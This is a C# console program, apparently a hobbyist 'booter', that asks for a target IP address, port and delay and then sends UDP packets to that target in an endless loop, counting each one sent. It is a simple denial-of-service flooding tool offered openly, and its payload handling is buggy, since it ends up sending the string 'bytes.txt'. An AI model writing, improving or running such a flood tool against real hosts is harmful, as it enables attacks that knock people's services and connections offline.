using System;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Text;

namespace Booter
{
    class Program
    {
        public static string ip;
        public static string filePath;

        public static int count = 0;
        public static int port;
        public static int power;

        public static void Main()
        {
            Console.Title = "Booter by cazdev";
            Console.ForegroundColor = ConsoleColor.Cyan;

            if (GetBytes())
            {
                using (StreamReader sr = new StreamReader(filePath))
                    filePath = sr.ReadToEnd();

                GetBytes();

                GetInfo();

                while (true)
                {
                    if (Send())
                    {
                        count++;
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"{count} Packets have been sent");

                        Console.Title = "Booter in progress";

                        Thread.Sleep(power);
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("");
                        Console.WriteLine($"Error while sending packets");

                        Console.Title = "Booter failed";

                        Console.ForegroundColor = ConsoleColor.Cyan;
                        GetBytes();
                        GetInfo();
                            
                    }
                }
            }
            else
            {
                Main();
            }
        }

        public static void GetInfo()
        {
            try
            {
                Console.Write("Enter IP Address: ");
                ip = Console.ReadLine();

                Console.Write("Enter Port: ");
                port = Convert.ToInt32(Console.ReadLine());

                Console.Write("Enter time between packets: ");
                power = Convert.ToInt32(Console.ReadLine());
            }
            catch { }
        }

        public static bool GetBytes()
        {
            filePath = "bytes.txt";

            if (!File.Exists(filePath))
            {
                File.Create(filePath).Dispose();
            }
            return true;

        }

        public static bool Send()
        {
            try
            {
                byte[] packetdata = Encoding.ASCII.GetBytes(filePath);
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), port);
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

                sock.Connect(new IPEndPoint(IPAddress.Parse(ip), port));
                sock.SendTo(packetdata, ep);
                return true;
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(ex.Message);
                return false;
            }
        }

        }
    }